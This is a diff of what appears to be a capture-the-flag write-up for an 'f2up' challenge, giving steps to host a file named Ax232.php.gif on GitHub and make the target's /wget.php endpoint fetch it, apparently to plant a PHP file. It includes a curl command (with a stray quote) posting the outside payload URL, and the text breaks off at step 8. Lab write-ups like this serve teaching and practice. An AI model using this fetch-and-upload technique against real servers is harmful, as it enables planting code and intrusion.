@@ -60,10 +60,10 @@ The filename needs to be constructed very precisely:
 	- $ mkdir f2up-challenge
         - $ cd f2up-challenge
         - $ sudo apt install gh
-        - $ gh auth login        			// Authenticate via web browser
-   	- $ gh repo create f2up-challenge --public	// create a repository
+        - $ gh auth login			// Authenticate via web browser
+	- $ gh repo create f2up-challenge --public	// create a repository
 
-   	- $ git init
+	- $ git init
 	- $ git add .
 	- $ git commit -m "Initial commit"
 	- $ git branch -M main
@@ -81,9 +81,15 @@ The filename needs to be constructed very precisely:
    https://github.com/mo7ammedAisha/f2up-challenge/blob/main/Ax232.php.gif
 
 
-8- now time to upload the file into the server
+
+7- now time to upload the file into the server
+
+   - using purb suit
     POST Request to: /wget.php
-    POST Data: url=https://your-hosting-location/AAAAAAAAAAAAAAAAA....php.gif
+    POST Data: url=https://github.com/mo7ammedAisha/f2up-challenge/Ax232.php.gif
 
-   - $ curl -X POST -d "url=" http://example.com/endpoint
+   - $ curl -X POST -d "url="https://github.com/mo7ammedAisha/f2up-challenge/Ax232.php.gif" cybertalent.com/wget.php 
 
+
+
+8- visit to the following 
